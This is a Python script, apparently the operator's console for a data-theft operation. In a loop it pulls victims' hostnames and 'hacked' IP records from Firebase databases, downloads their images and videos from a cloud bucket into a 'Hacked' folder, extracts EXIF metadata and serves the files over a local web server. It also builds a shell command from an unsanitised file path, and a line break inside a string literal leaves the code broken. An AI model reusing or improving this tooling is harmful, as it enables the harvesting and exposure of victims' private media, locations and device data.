import argparse
import os
import platform
import subprocess
from time import sleep

import requests
from google.cloud import storage

# Lista de extensiones de archivo permitidas
allowed_extensions = ['.png', '.jpg', '.mp4']

# Obtener nombres de host y mostrarlos sin repetir
def get_hostnames():
    os.system('cls' if os.name == 'nt' else 'clear')
    hostname_url = 'https://hostname-5c24b-default-rtdb.firebaseio.com/hostname/export.json'
    hostname_response = requests.get(hostname_url)
    hostname_data = hostname_response.json()

    print("HostName\n")
    hostnames = list(set(hostname_data.values()))
    for hostname in hostnames:
        print(f'----------\n{hostname}\n----------')

# Obtener y mostrar todos los datos de la base de datos de IPs
def get_all_ips():
    ip_url = 'https://data-fe2c3-default-rtdb.firebaseio.com/ip.json'
    ip_response = requests.get(ip_url)
    ip_data = ip_response.json()

    print("""\n
     ============
    | Ip Hacked |
    ============\n""")
    
    # Verificar si 'ip' está presente en los datos
    if 'ip' in ip_data:
        ips = ip_data['ip']['ips']
        with open('ip_data.txt', 'w') as file:
            for data in ips:
                if isinstance(data, dict):  # Verificar si es un diccionario
                    ip_info = ", ".join([f"{key}: {value}" for key, value in data.items()])
                    file.write(ip_info + '\n')
                elif isinstance(data, str):  # Verificar si es una cadena
                    file.write(data + '\n')
                else:
                    file.write(str(data) + '\n')

        # Leer y mostrar los datos del archivo de texto según el sistema operativo
        if platform.system() == 'Windows':
            os.system("type ip_data.txt | findstr /v /c:\",")
        else:
            os.system("cat ip_data.txt | grep -v ','")
    else:
        print("No se encontraron datos de IPs en la respuesta JSON.")

# Obtener nombres de archivos y mostrarlos sin repetir
def get_file_names():
    client = storage.Client.from_service_account_json(
        'services/serviceAccounts.json')
    bucket_name = 'pictuface-f9763.appspot.com'
    bucket = client.get_bucket(bucket_name)

    blobs = bucket.list_blobs(prefix='', delimiter='/')
    file_names = [blob.name for blob in blobs if any(
        blob.name.endswith(ext) for ext in allowed_extensions)]
    file_names = list(set(file_names))

    print("\n==============\n| Data Hacked |\n==============\n")
    for file_name in file_names:
        print('=> Data Extract Complete')
        download_path = f'C:/Users/Junnior/
        Desktop/Osiris/Hacked{file_name}'
        os.makedirs(os.path.dirname(download_path), exist_ok=True)
        blob = bucket.blob(file_name)
        blob.download_to_filename(download_path)
        print("Exitoso")

# Obtener datos EXIF de una imagen utilizando exiftool
def get_exif_data(image_path):
    os.system("cls" if os.name == "nt" else "clear")
    command = f'exiftool "{image_path}"'
    output = subprocess.check_output(command, shell=True, text=True)
    print(output)

# Crear el objeto de análisis de argumentos
parser = argparse.ArgumentParser()
parser.add_argument('-M', action='store_true', help='Monitor en tiempo real 👀')
parser.add_argument('-DH', nargs='?', const='', help='Extrae los metadatos🔎')
parser.add_argument('-V', nargs='?', const='', help='File data')

# Analizar los argumentos de línea de comandos
args = parser.parse_args()

# Ejecutar la función según los argumentos proporcionados
if args.M:
    # Bucle principal para obtener datos en tiempo real
    while True:
        get_hostnames()
        get_all_ips()
        get_file_names()
        sleep(17)
elif args.DH:
    # Ejecutar la función específica con la ruta de la imagen proporcionada
    os.system("cls" if os.name == "nt" else "clear")
    image_path = args.DH
    if image_path:
        get_exif_data(image_path)
    else:
        print("No image path provided.")
elif args.V:
    os.system("cls" if os.name == "nt" else "clear")
    print("Save Data")
    sleep(3.0)
    data = args.V
    os.system("dir Hacked" if os.name == 'nt' else "ls Hacked")
    op = input("=> ")
    if op == "run":
        os.system("termux-open http://[::]:7777 ; python -m http.server 7777 --directory Hacked")
    elif op == "exit":
        os.system("cls" if os.name == "nt" else "clear")
        exit()